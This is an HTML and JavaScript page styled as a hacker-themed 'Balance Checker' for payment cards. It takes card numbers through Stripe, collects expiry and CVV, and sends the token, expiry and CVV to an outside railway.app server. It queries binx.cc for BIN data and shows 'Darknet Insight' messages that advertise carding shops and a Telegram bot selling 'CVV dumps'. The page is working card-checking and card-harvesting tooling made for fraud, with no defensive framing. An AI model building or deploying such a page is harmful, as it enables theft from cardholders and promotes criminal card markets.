<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hackershit</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://js.stripe.com/v3/"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 50%, #000d1a 100%);
            color: #00ff88;
            overflow-x: hidden;
            animation: galaxySwirl 20s infinite linear;
        }
        @keyframes galaxySwirl {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 20% 80%, #00ff88 1px, transparent 1px),
                             radial-gradient(circle at 80% 20%, #8a2be2 1px, transparent 1px),
                             radial-gradient(circle at 40% 40%, #00ff88 1px, transparent 1px);
            background-size: 100px 100px;
            animation: twinkle 4s infinite alternate;
            z-index: -1;
        }
        @keyframes twinkle {
            0% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        h1 {
            text-align: center;
            font-size: 3em;
            color: #8a2be2;
            text-shadow: 0 0 20px #00ff88, 0 0 40px #8a2be2;
            margin-top: 50px;
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #00ff88; }
            to { text-shadow: 0 0 30px #8a2be2; }
        }
        form {
            max-width: 400px;
            margin: 50px auto;
            background: linear-gradient(45deg, #2e0033, #001a1a);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 30px #00ff88, inset 0 0 30px rgba(138, 43, 226, 0.5);
            border: 2px solid #8a2be2;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #00ff88;
            border-radius: 5px;
            background: #000;
            color: #00ff88;
            font-family: 'Orbitron', sans-serif;
            box-shadow: 0 0 10px #8a2be2;
        }
        input[type="text"]:focus {
            outline: none;
            box-shadow: 0 0 20px #00ff88;
        }
        #card-element {
            padding: 10px;
            border: 1px solid #00ff88;
            border-radius: 5px;
            background: #000;
            color: #00ff88;
        }
        input[type="submit"] {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #00ff88, #8a2be2);
            border: none;
            border-radius: 5px;
            color: #000;
            font-size: 1.2em;
            font-family: 'Orbitron', sans-serif;
            cursor: pointer;
            box-shadow: 0 0 20px #00ff88;
            transition: all 0.3s ease;
        }
        input[type="submit"]:hover {
            box-shadow: 0 0 40px #8a2be2;
            transform: scale(1.05);
        }
        #result {
            max-width: 400px;
            margin: 20px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
            text-align: center;
            font-size: 1.2em;
            color: #00ff88;
            box-shadow: 0 0 20px #8a2be2;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        #result.show {
            opacity: 1;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #00ff88;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Balance Checker</h1>
    <form id="balanceForm">
        Card Number: <div id="card-element"></div>
        Exp (MM/YY): <input type="text" id="exp" name="exp" required><br>
        CVV: <input type="text" id="cvv" name="cvv" required><br>
        <input type="submit" value="Check Balance">
    </form>
    <div id="result"></div>
    <script>
        const stripe = Stripe('pk_live_51RyFQw3xHLWv8lmEAOHH59LVElWtham2vZdh5onQjjgthirQRut6PmKzSCYxc0w0upWSbzKJyLFJ9bdmnG122siA00D0Nnt7hO'); // Replace with your Stripe publishable key (pk_live_... for production)
        const elements = stripe.elements();
        const cardElement = elements.create('card', {
            style: {
                base: {
                    color: '#00ff88',
                    fontFamily: "'Orbitron', sans-serif",
                    fontSize: '16px',
                    '::placeholder': {
                        color: '#00ff88',
                    },
                },
            },
        });
        cardElement.mount('#card-element');

        // Custom logic: Format expiry
        document.getElementById('exp').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });

        // Custom logic: Limit CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });

        // Custom logic: BIN fetch and darknet insight
        async function fetchBinDetails(bin) {
            try {
                const response = await fetch(`https://binx.cc/bin/${bin}`);
                if (response.ok) {
                    const text = await response.text();
                    const title = text.match(/<title>(.*?)<\/title>/)?.[1] || 'Details on BinX';
                    return title;
                }
            } catch (err) {
                return 'Fetch failed';
            }
            return 'Unknown BIN';
        }

        function getDarknetInsight(bin, balance) {
            const darknetShops = {
                'RoseCC (CVV)': { url: 'https://www.rosecc.pw/signup?referral=BinXXX', review: 'Highly reliable with instant CVV dumps and excellent community reviews on BinX.cc. Best for fresh high-limit cards.' },
                'Qyzet (CVV)': { url: 'https://t.me/qyzetbot', review: 'Telegram bot with stellar reviews for quick CVV checks and dumps. Essential for real-time validation.' }
            };
            if (bin.startsWith('4')) {
                return `Check ${darknetShops['RoseCC (CVV)'].url} - ${darknetShops['RoseCC (CVV)'].review}`;
            } else {
                return `For this BIN, try ${darknetShops['Qyzet (CVV)'].url} - ${darknetShops['Qyzet (CVV)'].review}`;
            }
        }

        // Custom logic: Form submission with Stripe tokenization
        document.getElementById('balanceForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const exp = document.getElementById('exp').value;
            const cvv = document.getElementById('cvv').value;
            const resultDiv = document.getElementById('result');

            // Custom validation
            if (!/^\d{2}\/\d{2}$/.test(exp)) {
                resultDiv.innerText = 'Error: Invalid exp format (MM/YY)';
                resultDiv.className = 'show';
                return;
            }
            if (!/^\d{3,4}$/.test(cvv)) {
                resultDiv.innerText = 'Error: Invalid CVV';
                resultDiv.className = 'show';
                return;
            }

            // Custom loading state
            resultDiv.innerHTML = '<div class="loading"></div> Checking balance...';
            resultDiv.className = 'show';

            // Tokenize card with Stripe
            const { token, error } = await stripe.createToken(cardElement);
            if (error) {
                resultDiv.innerText = `Error: ${error.message}`;
                return;
            }

            const bin = token.card.id.substring(0, 6); // Approximate BIN from token
            const binInfo = await fetchBinDetails(bin);

            try {
                const response = await fetch('https://hackershit-production.up.railway.app', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: token.id,
                        exp: exp,
                        cvv: cvv
                    })
                });

                const data = await response.json();
                const darknetInsight = getDarknetInsight(bin, data.balance);
                resultDiv.innerHTML = `
                    BIN ${bin}: ${binInfo}<br>
                    <a href="https://binx.cc/bin/${bin}" target="_blank" style="color: #00ff88;">Check BIN on BinX</a><br>
                    Balance: ${data.balance}<br>
                    Darknet Insight: ${darknetInsight}
                `;
            } catch (error) {
                resultDiv.innerText = 'Error: Network issue';
            }
        });
    </script>
</body>
</html>
